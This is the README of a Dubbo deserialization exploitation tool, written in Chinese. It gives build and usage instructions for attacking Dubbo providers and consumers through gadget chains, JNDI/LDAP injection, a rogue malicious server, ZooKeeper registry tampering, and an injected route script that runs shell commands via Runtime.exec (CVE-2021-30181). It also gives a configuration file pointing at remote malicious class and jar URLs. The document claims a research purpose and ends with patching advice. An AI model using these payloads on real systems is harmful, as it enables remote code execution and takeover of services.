*工具仅用于安全研究以及内部自查，禁止使用工具发起非法攻击，造成的后果使用者负责*

# Dubbo反序列化测试工具

## 1. 编译&构建
```
mvn assembly:single
```

## 2. 使用帮助
```
usage: java -jar exp.jar [OPTION]
- -h --help               帮助信息
- -l --list             输出所有gadget信息
- -g --gadget <arg>          gadget名称
- -a --args <arg>      gadget入参，多个参数使用多次该命令传入，例-a http://127.0.0.1:80/ -a Calc
- -p --protocol <arg>   [dubbo|http] 通讯协议名称，默认缺省dubbo
- -s --serialization <arg>          [hessian|java] 序列化类型，默认缺省hessian
- -t --target <arg>          目标，例：127.0.0.1:20880
- -f --fastcheck <arg>   快速攻击检查（使用预置参数数据文件，遍历所有gadget进行攻击检查），参数为数据文件路径，参考文件check.data
- -e --evil    恶意服务模式，也就是通过返回恶意序列化数据给客户端，从而攻击连接进来的服务
- -evilHost <arg>    恶意服务ip
- -evilPort <arg>    恶意服务port
- -registry <arg>    [zookeeper]，暂时仅实现了攻击zookeeper，恶意服务模式下，攻击注册中心，控制客户端连接到本恶意服务，也就是通过返回恶意序列化数据给客户端，从而攻击连接进来的服务
- -scheme <arg>      [auth|digest]，zookeeper认证类型
- -username <arg>    [zookeeperUsername]，zookeeper认证账号
- -password <arg>    [zookeeperPassword]，zookeeper认证密码，digest：要对passWord进行MD5哈希，然后再进行bese64
- -registryURL <arg> zookeeper url，例：127.0.0.1:2181
- --wait <arg> 等待客户端回连超时时间，默认1000（毫秒）
```

## 3. example
### 3.1. 特定gadget检测
#### 3.1.1. 主动攻击（攻击服务端provider）
例（测试dubbo默认缺省情况下使用的dubbo协议+hessian2反序列化）：
- target：攻击的目标dubbo provider的ip&port
- protocol：rpc协议
- serialization：序列化协议
- gadget：反序列化利用链
- args：反序列化利用链参数

```
--target
127.0.0.1:20881
--protocol
dubbo
--serialization
hessian
--gadget
rome
--args
ldap://127.0.0.1:43658/Calc
```

例（测试dubbo在使用http协议+java反序列化，dubbo < 2.7.5前使用http协议，后续改为了jsonrpc）CVE-2019-17564：
```
--target
127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService
--protocol
http
--serialization
java
--gadget
CommonsCollections8
--args
/System/Applications/Calculator.app/Contents/MacOS/Calculator
```
#### 3.1.2. 恶意服务-被动攻击（攻击客户端consumer）
什么意思呢？其实就是起一个恶意的TCP服务，让Dubbo Consumer连接进来交互，返回恶意的序列化数据给Consumer，进而攻击、入侵Consumer！
- e：表示启动一个恶意的TCP服务
- evilHost：恶意TCP服务的Host
- evilPort：恶意TCP服务的port
- serialization：序列化协议
- gadget：反序列化利用链
- args：反序列化利用链参数
例（使用恶意服务攻击dubbo客户端）：
```
-e
-evilHost
127.0.0.1
-evilPort
44444
--serialization
java
--gadget
CommonsCollections8
--args
/System/Applications/Calculator.app/Contents/MacOS/Calculator
```
#### 3.1.3. 恶意服务-主动攻击（攻击客户端consumer）
例（使用恶意服务并主动篡改zookeeper，主动攻击dubbo客户端）：
```
-e
-evilHost
127.0.0.1
-evilPort
44444
-registry
zookeeper
-registryURL
127.0.0.1:2181
--serialization
java
--gadget
CommonsCollections8
-f
/Users/xuanyonghao/security/java/my-project/dubbo-exp/check.data
```
### 3.2. route攻击（CVE-2021-30181）
#### 3.2.1. 注入js脚本主动攻击（攻击客户端consumer）
这个是往注册中心注入恶意地址、脚本，实施对Consumer的攻击！

例（通过在zookeeper注入脚本，实现攻击客户端consumer）：
```
-registry
zookeeper
-registryURL
127.0.0.1:2181
-route
script
-rule
"s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='open -a calculator';java.lang.Runtime.getRuntime().exec(s);"
-routeDeleteTtl
5
```
### 3.3. 快速检测
#### 3.3.1. 恶意服务-被动攻击（攻击客户端consumer）
PS：使用被动攻击快速检测办法，有多少个gadget就会打开多少个恶意服务端口（因为客户端存在失败记录，不会再连接），
每个端口返回一种gadget恶意序列化数据，等待客户端连接上来，会比较慢，就是视业务调用频率和心跳，所以，建议使用单个gadget精准打击。

例（使用恶意服务快速被动攻击dubbo客户端）：
```
-e
-evilHost
127.0.0.1
-evilPort
44444
--serialization
java
--wait
5000
-f
/Users/xuanyonghao/security/java/my-project/dubbo-exp/check.data
```

例（使用恶意服务并主动篡改zookeeper，快速主动攻击dubbo客户端）：
```
-e
-evilHost
127.0.0.1
-evilPort
44444
-registry
zookeeper
-registryURL
127.0.0.1:2181
--serialization
java
--wait
5000
-f
/Users/xuanyonghao/security/java/my-project/dubbo-exp/check.data
```
#### 3.3.2. 快速主动攻击（攻击服务端provider）
例（快速攻击检测，若不指定序列化类型，则全部gadget都会尝试）：
```
java -jar dubbo-exp.jar
--target 127.0.0.1:20881 
--fastcheck /Users/threedr3am/dubbo-exp/check.data
```
check.dat预置参数文件内容：
```
### 快速漏洞攻击参数配置（将会根据相应匹配的参数选择对应的所有gadget攻击）
### 多个参数英文逗号分割

#JNDI注入url，JNDI注入需要考虑对方jdk版本，若是jdk8，
# 当小于jdk8u121，可以使用rmi服务进行JNDI注入攻击，
# jdk8u121～jdk8u191之间可以选择ldap服务替代，
# jdk8u191+需要使用tomcat-el依赖打法，或者使用gadget
JNDI=ldap://127.0.0.1:43658/Calc

#执行的shell命令
CMD=/System/Applications/Calculator.app/Contents/MacOS/Calculator
#或者 CMD=/bin/bash,-c,/System/Applications/Calculator.app/Contents/MacOS/Calculator

#Reference远程class代码url（在http服务器根存在一个Calc.class）
CODEBASE=http://127.0.0.1:80,Calc

#恶意jar包url（在http服务器根存在一个R.jar，jar包中存在一个恶意的class - Calc.class）
JAR=http://127.0.0.1:8080/R.jar,Calc

#DNS服务url
DNS=http://xxxx.ceye.io
```


## 4. gadget列表

    ---------------------------------------------------------------------------------------------------------
    1. 名称：resin
    2. 需要入参数量：2
    3. 参数说明：arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的
    4. 序列化类型：hessian
    5. 依赖：com.caucho:quercus:*     dubbo版本<=2.7.5
    ---------------------------------------------------------------------------------------------------------
    1. 名称：rome
    2. 需要入参数量：1
    3. 参数说明：arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）
    4. 序列化类型：hessian
    5. 依赖：com.rometools:rome:*     dubbo版本<=2.7.5
    ---------------------------------------------------------------------------------------------------------
    1. 名称：spring-aop
    2. 需要入参数量：1
    3. 参数说明：arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）
    4. 序列化类型：hessian
    5. 依赖：org.springframework:spring-aop     受Spring版本限制
    ---------------------------------------------------------------------------------------------------------
    1. 名称：xbean
    2. 需要入参数量：2
    3. 参数说明：arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的
    4. 序列化类型：hessian
    5. 依赖：org.apache.xbean:xbean-naming:*     dubbo版本<2.7.5
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsBeanutils
    2. 需要入参数量：1
    3. 参数说明：arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）
    4. 序列化类型：java
    5. 依赖：
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsBeanutils1
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：commons-beanutils:commons-beanutils:1.9.2
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections1
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections2
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：org.apache.commons:commons-collections4:4.0
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections3
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections3ForLoadJar
    2. 需要入参数量：2
    3. 参数说明：arg[0]=jar包下载地址，例：http://127.0.0.1:8080/R.jar，arg[1]=jar包中恶意类名称
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections5
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections5ForLoadJar
    2. 需要入参数量：2
    3. 参数说明：arg[0]=jar包下载地址，例：http://127.0.0.1:8080/R.jar，arg[1]=jar包中恶意类名称
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections6
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections6ForLoadJar
    2. 需要入参数量：2
    3. 参数说明：arg[0]=jar包下载地址，例：http://127.0.0.1:8080/R.jar，arg[1]=jar包中恶意类名称
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections7
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections8
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：org.apache.commons:commons-collections4:4.0
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections9
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections10
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：CommonsCollections11
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：commons-collections:commons-collections:3.2.1
    ---------------------------------------------------------------------------------------------------------
    1. 名称：URLDNS
    2. 需要入参数量：1
    3. 参数说明：arg[0]=dns server url
    4. 序列化类型：java
    5. 依赖：
    ---------------------------------------------------------------------------------------------------------
    1. 名称：C3P0
    2. 需要入参数量：2
    3. 参数说明：arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的
    4. 序列化类型：java
    5. 依赖：com.mchange:c3p0:0.9.5.2  com.mchange:mchange-commons-java:0.2.11
    ---------------------------------------------------------------------------------------------------------
    1. 名称：rome
    2. 需要入参数量：1
    3. 参数说明：arg[0]=cmd
    4. 序列化类型：java
    5. 依赖：com.rometools:rome:*


## 5. 漏洞修复建议
- 默认缺省的dubbo协议hessian反序列化漏洞：参考 [learnjavabug](https://github.com/threedr3am/learnjavabug) 项目module->dubbo/dubbo-hessian2-safe-reinforcement，使用反序列化黑名单形式进行安全加固
- dubbo版本<2.7.5，http协议反序列化漏洞（CVE-2019-17564）：升级到最新版本2.7.5修复
- dubbo版本<=2.7.7、<=2.6.8、2.5.x，注册中心（zookeeper）未授权或者弱口令导致可读写，进行恶意服务DubboRouge被动攻击（CVE-2021-25641）：建议检查Zookeeper这些服务的脆弱性进行防护，并升级到2.7.8、2.6.9修复
- dubbo版本<=2.7.7、<=2.6.8、2.5.x，注册中心（zookeeper）未授权或者弱口令导致可读写，插入恶意脚本攻击客户端consumer（CVE-2021-30181）：建议检查Zookeeper这些服务的脆弱性进行防护，并升级到2.7.8、2.6.9修复